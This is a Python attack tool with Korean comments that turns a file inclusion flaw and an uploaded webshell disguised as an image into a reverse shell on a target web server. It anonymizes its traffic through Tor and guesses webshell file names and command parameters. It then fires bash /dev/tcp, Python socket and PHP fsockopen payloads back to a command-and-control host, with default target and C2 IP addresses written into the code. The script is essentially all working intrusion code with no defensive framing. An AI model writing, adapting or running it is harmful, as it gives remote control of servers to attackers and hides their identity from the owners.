#!/usr/bin/env python3
"""
LFI를 통한 리버스 쉘 트리거
"""

import requests
import sys
from urllib.parse import quote

def trigger_reverse_shell(target_ip, webshell_name, c2_ip, c2_port=4444):
    """LFI + 웹쉘로 리버스 쉘 트리거"""

    # Tor 프록시
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    base_url = f"http://{target_ip}"

    # 리버스 쉘 페이로드들
    payloads = [
        f"bash -c 'bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1'",
        f"bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1",
        f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1'",
        f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{c2_ip}\",{c2_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        f"php -r '$sock=fsockopen(\"{c2_ip}\",{c2_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    ]

    print(f"[*] 타겟: {target_ip}")
    print(f"[*] 웹쉘: {webshell_name if webshell_name else '자동 탐색'}")
    print(f"[*] C2: {c2_ip}:{c2_port}")
    print(f"[*] Tor 프록시 사용\n")

    # 웹쉘 파일명이 없으면 자동 탐색
    if not webshell_name or webshell_name == 'auto':
        print("[*] 업로드된 파일 자동 탐색...")
        possible_files = [
            'banner.png', 'banner.php.png', 'logo.png.php',
            'photo.php.jpg', 'avatar.jpg.php', 'profile.php.jpg',
            'image.jpg.php', 'icon.php.png', 'theme.png.php'
        ]

        for filename in possible_files:
            try:
                test_url = f"{base_url}/uploads/{filename}"
                resp = requests.head(test_url, proxies=proxies, timeout=5)
                if resp.status_code == 200:
                    print(f"    [+] 발견: {filename}")
                    webshell_name = filename
                    break
            except:
                pass

        if not webshell_name:
            print("[-] 파일을 찾을 수 없습니다")
            return

    print(f"[+] 사용할 파일: {webshell_name}\n")

    # 먼저 간단한 명령으로 테스트 (다양한 파라미터명 시도)
    print("[1] 웹쉘 테스트...")

    param_names = ['x', 'cmd', 'c', 'command', 'exec', 'e', 'run', 'do']
    working_param = None

    for param in param_names:
        test_url = f"{base_url}/file.php?name=uploads/{webshell_name}&{param}=whoami"

        try:
            response = requests.get(test_url, proxies=proxies, timeout=10)
            print(f"    파라미터 '{param}': Status {response.status_code}")

            if response.status_code == 200 and 'apache' in response.text.lower() or 'www-data' in response.text.lower():
                print(f"[+] 작동하는 파라미터 발견: {param}")
                print(f"    응답: {response.text[:200]}")
                working_param = param
                break

        except Exception as e:
            print(f"    파라미터 '{param}': 오류")

    if not working_param:
        print("\n[-] 작동하는 파라미터를 찾을 수 없습니다")
        print("[!] LFI만으로도 시도해봅시다 (파라미터 없이)\n")
        working_param = 'x'  # 기본값
    else:
        print(f"\n[+] '{working_param}' 파라미터 사용\n")

    # 리버스 쉘 트리거
    print("[2] 리버스 쉘 트리거...")
    print(f"[!] C2 서버에서 리스너 준비: nc -lvnp {c2_port}\n")

    input("준비되면 Enter를 누르세요...")

    for i, payload in enumerate(payloads, 1):
        print(f"\n[*] 시도 {i}/{len(payloads)}: {payload[:50]}...")

        lfi_url = f"{base_url}/file.php?name=uploads/{webshell_name}&x={quote(payload)}"

        try:
            # 타임아웃 짧게 (연결되면 응답 안 올 수 있음)
            response = requests.get(lfi_url, proxies=proxies, timeout=3)
            print(f"    응답: {response.status_code}")

        except requests.exceptions.Timeout:
            print(f"    [+] 타임아웃 (리버스 쉘 연결되었을 수 있음)")

        except Exception as e:
            print(f"    오류: {str(e)[:100]}")

        # 다음 시도 전 대기
        import time
        time.sleep(2)

    print("\n[*] 모든 페이로드 시도 완료")
    print("[*] C2 서버 리스너 확인하세요")


def main():
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   LFI + 웹쉘 리버스 쉘 트리거                             ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    if len(sys.argv) >= 4:
        target_ip = sys.argv[1]
        webshell_name = sys.argv[2]
        c2_ip = sys.argv[3]
        c2_port = int(sys.argv[4]) if len(sys.argv) > 4 else 4444
    else:
        target_ip = input("타겟 IP (기본: 43.201.154.142): ").strip() or "43.201.154.142"
        webshell_name = input("웹쉘 파일명 (기본: banner.png): ").strip() or "banner.png"
        c2_ip = input("C2 서버 IP (기본: 57.181.28.7): ").strip() or "57.181.28.7"
        c2_port = int(input("C2 포트 (기본: 4444): ").strip() or "4444")

    trigger_reverse_shell(target_ip, webshell_name, c2_ip, c2_port)


if __name__ == "__main__":
    main()
